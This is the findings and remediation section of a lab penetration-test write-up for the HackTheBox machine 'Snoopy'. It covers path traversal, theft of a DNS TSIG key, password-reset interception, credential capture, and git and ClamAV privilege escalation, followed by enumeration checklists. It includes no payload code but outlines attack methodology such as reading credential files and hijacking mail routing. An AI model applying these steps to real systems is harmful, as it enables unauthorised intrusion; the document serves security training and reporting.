**Final outcome:** root access achieved. User flag recorded. Root flag and complete root-key disclosure evidence remain to be copied from the original terminal transcript into the final evidence bundle.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Findings and Remediation

The following findings represent the confirmed weaknesses or attack-chain components. CVSS values below are provisional estimates for report planning; final scoring should be validated against the exact scope, preconditions, and impact evidence in the reporting tool.

#### Finding 1 - Arbitrary File Read Through the Download Endpoint

**Severity:** High  
**Suggested classification:** CWE-22 - Path Traversal  
**Affected asset:** `snoopy.htb`, `/download?file=`

**Evidence**

- Traversal sequences using `....//` bypassed normal path handling.
- `/etc/passwd` was retrieved.
- BIND configuration files and process metadata were accessible.
- Sensitive configuration material was exposed.

**Impact**

An unauthenticated remote attacker could read files available to the web application process. The practical impact extended beyond ordinary system information because a readable configuration file contained the TSIG secret used to modify DNS records.

**Remediation**

- Replace user-controlled filesystem paths with a strict allowlist of permitted files.
- Canonicalize paths and verify that the resolved target remains inside the intended directory.
- Reject traversal sequences after normalization, rather than relying on simple string filters.
- Run the web application with the minimum filesystem permissions required.
- Avoid storing secrets in files readable by the web process.
- Add regression tests for encoded and alternative traversal sequences.

#### Finding 2 - Exposed BIND TSIG Secret and Excessive DNS Update Permissions

**Severity:** High  
**Suggested classifications:** CWE-200 - Exposure of Sensitive Information; CWE-732 - Incorrect Permission Assignment

**Affected asset:** BIND configuration for `snoopy.htb`

**Evidence**

- `/etc/bind/named.conf` disclosed the `rndc-key` secret.
- `named.conf.local` allowed dynamic updates authenticated with that key.
- The recovered key successfully authenticated `nsupdate` requests.
- A test TXT record was added, queried, and deleted.
- The mail A record was modified to the attacker's VPN address.

**Impact**

An attacker able to read the configuration could authenticate DNS modifications. This enabled redirection of a mail hostname and facilitated password-reset interception.

**Remediation**

- Keep TSIG secrets out of web-readable configuration paths.
- Restrict BIND configuration and key-file permissions.
- Limit dynamic updates to the smallest necessary set of records and trusted identities.
- Review whether the broad `10.0.0.0/8` transfer restriction is appropriate.
- Restrict zone transfers to explicitly authorized secondary servers.
- Rotate the exposed TSIG key and remove obsolete keys.
- Monitor and alert on unexpected DNS updates.
- Reassess whether the application and DNS service need to share a host and filesystem permissions.

#### Finding 3 - Password-Reset Interception Through DNS Manipulation

**Severity:** High as part of the demonstrated attack chain  
**Suggested classification:** CWE-640 - Weak Password Recovery Mechanism, with the underlying DNS trust failure documented separately

**Affected asset:** Mattermost password-reset workflow

**Evidence**

- `mail.snoopy.htb` was redirected to `10.10.14.254`.
- A Python SMTP listener was established on TCP/25.
- A password-reset email was received.
- The quoted-printable token was reconstructed and used to complete the reset.

**Impact**

The attacker could redirect password-reset delivery and obtain a valid reset token for the targeted application account.

**Remediation**

- Correct the DNS update permissions and protect the signing key.
- Ensure password-reset messages are sent through a controlled mail infrastructure.
- Use single-use, time-limited reset tokens and invalidate them after use.
- Avoid trusting attacker-influenced mail routing.
- Monitor for abnormal reset activity and changes to mail-related DNS records.

#### Finding 4 - Provisioning Integration Leaked SSH Credentials to an Untrusted Destination

**Severity:** High  
**Suggested classification:** CWE-522 - Insufficiently Protected Credentials

**Affected asset:** Mattermost server-provisioning integration

**Evidence**

- A provisioning request caused an SSH connection to an attacker-controlled listener.
- The connection identified itself as `SSH-2.0-paramiko_3.1.0`.
- A Paramiko honeypot captured `cbrown` and the password `[REDACTED]`.

**Impact**

The integration disclosed credentials to an attacker-controlled SSH server. The recovered password enabled an SSH foothold on Snoopy.

**Remediation**

- Restrict provisioning destinations to an explicit allowlist.
- Verify SSH host keys rather than trusting any server at the requested address.
- Never send reusable credentials to arbitrary remote hosts.
- Use short-lived credentials or scoped SSH keys.
- Audit the plugin's authorization checks and request validation.
- Record provisioning requests and remote authentication destinations.

#### Finding 5 - Symlink-Based Privilege Escalation Through Restricted Git Execution

**Severity:** High  
**Suggested classification:** CWE-59 - Improper Link Resolution Before File Access

**Affected asset:** Snoopy, `cbrown` sudo configuration

**Evidence**

```text
(sbrown) PASSWD: <REDACTED> ^apply -v [a-zA-Z0-9.]+$
```

- The permitted command was executed as `sbrown`.
- The initial attempt failed because `cbrown` could not unlink the symlink in the shared temporary directory.
- Changing the working directory's permissions resolved the setup problem.
- A subsequent SSH login as `sbrown` confirmed that the public-key installation succeeded.

**Impact**

The restricted Git command provided a route from `cbrown` to `sbrown`, enabling access to the next privileged execution rule.

**Remediation**

- Remove the sudo permission if it is unnecessary.
- Avoid granting Git patch operations across privilege boundaries.
- Ensure privileged Git operations run in a directory not writable by lower-privileged users.
- Prevent symlink-based writes to privileged directories.
- Patch Git to an appropriate supported release.
- Prefer a narrowly scoped, audited helper program over arbitrary patch application.

#### Finding 6 - Root-Level ClamAV Debug Execution Allowed XXE Disclosure

**Severity:** High  
**Suggested classification:** CWE-611 - Improper Restriction of XML External Entity Reference

**Affected asset:** Snoopy, `/usr/local/bin/clamscan`

**Evidence**

```text
(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

The installed version was:

```text
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

The demonstrated chain used crafted DMG metadata and the scanner's debug output to disclose a root SSH private key.

**Impact**

A user able to write an input file to the scan directory could exploit the privileged scanner invocation to disclose a root credential and obtain root access.

**Remediation**

- Upgrade ClamAV to a supported release containing the relevant security fixes.
- Remove unnecessary root-level scanner execution.
- Run scanning services under a dedicated low-privilege account.
- Prevent user-controlled files from being processed by privileged parsers.
- Disable unnecessary debug output in privileged workflows.
- Review and rotate any SSH keys exposed by the vulnerability.
- Audit all files scanned by privileged jobs and any associated debug logs.

---

### Reusable CPTS Lessons

#### DNS enumeration checklist

Whenever DNS is exposed:

- Attempt AXFR against relevant zones.
- Enumerate A, AAAA, MX, TXT, NS, and SOA records where appropriate.
- Identify internal hostnames and network ranges.
- Read `/etc/bind/named.conf`.
- Read `/etc/bind/named.conf.options`.
- Read `/etc/bind/named.conf.local`.
- Follow every referenced zone-file path.
- Search configuration for TSIG keys, update policies, transfer permissions, and secrets.
- Test recovered DNS credentials in a controlled way.
- Verify every update with an authoritative query.
- Record the TTL and revalidate dynamic records before using them.

#### LFI enumeration checklist

- Start with `/etc/passwd` and `/etc/hostname`.
- Inspect application configuration and web-server configuration.
- Inspect process command lines and process status.
- Inspect routing and resolver configuration.
- Read DNS configuration when present.
- Inspect scheduled tasks and service configuration.
- Check whether responses are raw files, archives, or wrapper output.
- Treat empty responses as inconclusive until validated.
- Keep an evidence record for every recovered secret and its source.

#### Credential and application-integration checklist

- Inspect all relevant channels, direct messages, and integrations.
- Search for server names, SSH, provisioning, passwords, credentials, IPA, and security tooling.
- Identify whether integrations connect to user-supplied destinations.
- Test callbacks with a passive listener first.
- Use a protocol-aware server when authentication behavior needs to be observed.
- Record the source of each credential.
- **REUSE CREDS EVERYTIME WE CAN**, while staying within the authorized scope.
- Do not confuse a successful connection with successful authentication.

#### Privilege-escalation checklist

- Run `id`, `groups`, `sudo -l`, and relevant local enumeration.
- Read the exact sudo command and its argument restrictions.
- Examine file ownership, parent-directory permissions, and symlink behavior.
- Check whether a privileged process parses attacker-controlled files.
- Enumerate the version of the actual executable, not merely the package name.
- Check whether debug output can expose privileged data.
- Validate the full transition to the next identity before continuing.
- Capture proof of the user and root flags as soon as access is achieved.

#### Reporting checklist

For every significant step, record:

1. What was discovered.
2. The exact command or request used.
3. The observed output.
4. Why the result matters.
5. The next hypothesis.
6. How that hypothesis was validated.
7. Any failed attempts and their causes.
8. The resulting privilege boundary or attack-chain transition.
9. The impact and remediation.
10. The supporting evidence identifier.

This follows the evidence-driven approach required for a professional CPTS report. The final report should contain one clear end-to-end attack narrative, separate vulnerability findings, affected assets, impact, remediation, and an evidence register.

---
